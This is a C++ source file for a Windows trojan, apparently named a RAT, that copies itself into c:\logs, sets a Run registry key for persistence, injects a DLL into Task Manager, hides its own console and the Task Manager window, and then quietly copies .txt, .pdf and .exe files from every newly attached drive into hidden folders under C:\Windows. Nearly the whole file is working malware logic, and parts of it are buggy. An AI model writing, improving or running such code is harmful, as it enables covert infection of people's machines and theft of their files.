#include "rat.h"

static void injectdll(void)
{
    DWORD targetPID = pidof(TARGET_PROCESS);
    char buffer[32];
    _ltoa((long)targetPID, buffer, 10);
    Logger(buffer);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (hProcess == NULL)
    {
        Logger("taskmanager cant handle");
    }

    WCHAR fullDllPath[MAX_PATH];
    DWORD pathLen = GetFullPathNameW(PATH_TO_INJECTED_DLL, MAX_PATH, fullDllPath, NULL);

    if (!injectDll(hProcess, fullDllPath))
    {
        Logger("cant inject");
        CloseHandle(hProcess);
    }
    Logger("successfully injected");
    CloseHandle(hProcess);
}

static void controldll(void)
{
    if (PathFileExists(L"calo.dll") == FALSE)
    {
        Logger("calo.dll cant found");
        _exit(1);
    }
}

static const void regeditrun()
{
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
    {
        LPCTSTR regszstring = L"deneme";
        if (RegSetValueEx(hKey, TEXT("systemcli"), 0L, REG_SZ, (CONST BYTE*)regszstring, sizeof(TCHAR) * (strlen((CONST CHAR*)regszstring) + MAX_LENGTH)) == ERROR_SUCCESS) 
        {
            Logger("successfully added to regedit for run");
            RegCloseKey(hKey);
        }
    }
}

static const void copyitself(TCHAR loc[])
{
    TCHAR exename[MAX_PATH];
    DWORD getname = GetModuleFileName(NULL, exename, MAX_PATH);
    if (getname)
    {
        std::filesystem::copy(exename, loc);
    }
    else
    {
        Logger("i cant get exename");
    }
}

std::string createcalofolder(std::string extentions)
{
    std::string makefolder = "mkdir ";
    makefolder += "C:\\Windows\\calo\\";
    makefolder += extentions;
    system(makefolder.c_str());
    std::string calofolder = "C:\\Windows\\calo\\" + extentions + "\\";
    return calofolder;
}

int wmain(int argc, WCHAR* argv[])
{
    system("rmdir c:\\logs /s /Q");
    system("mkdir c:\\logs");
    TCHAR loc[] = L"C:\\logs";
    copyitself(loc);
    regeditrun();
    controldll();
    system("Taskmgr.exe");
    Sleep(1000);
    injectdll();
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    HWND hwnd = FindWindowA(0,("Task Manager"));
    ShowWindow(hwnd, SW_HIDE);
    mtx.lock();
    char buffer[MAX_PATH], drive;
    GetSystemDirectory((LPWSTR)buffer, sizeof(buffer));
    drive = *buffer;
    std::string windowsdir = "in " + drive;
    Logger(windowsdir);
    if (drive == 'C')
    {
        Logger("windows working on c: disk");
    }
    controldevice(DRIVE_LIST);
    for (;;) 
    {
        controldevice(NEW_DRIVE_LIST);
        for (int i = 0; i < MAX_LENGTH; i++) 
        {
            if ((NEW_DRIVE_LIST[i] >= 65 && NEW_DRIVE_LIST[i] <= 89) && (DRIVE_LIST[i] == '0'))
            {
                Logger("device plugged : ");
                std::string drivelist;
                drivelist.push_back(NEW_DRIVE_LIST[i]);
                Logger(drivelist);
                DRIVE_LIST[i] = NEW_DRIVE_LIST[i];
                std::string newdevices;
                newdevices.push_back(NEW_DRIVE_LIST[i]);
                newdevices += ":\\";
                copy_file_with_extentions(newdevices, createcalofolder(txt),txt);
                copy_file_with_extentions(newdevices, createcalofolder(pdf), pdf);
                copy_file_with_extentions(newdevices, createcalofolder(exe), exe);
            }
        }
        for (int i = 0; i < MAX_LENGTH; i++) 
        {
            NEW_DRIVE_LIST[i] = '0';
        }
        controldevice(NEW_DRIVE_LIST);
        for (int i = 0; i < MAX_LENGTH; i++) 
        {
            if ((DRIVE_LIST[i] >= 65 && DRIVE_LIST[i] <= 89) && (NEW_DRIVE_LIST[i] == '0')) 
            {
                Logger("device unplagged : ");
                std::string drivelist;
                drivelist.push_back(DRIVE_LIST[i]);
                Logger(drivelist);
                Sleep(500);
                DRIVE_LIST[i] = NEW_DRIVE_LIST[i];
            }
        }
        Sleep(200);
    }
    mtx.unlock();
}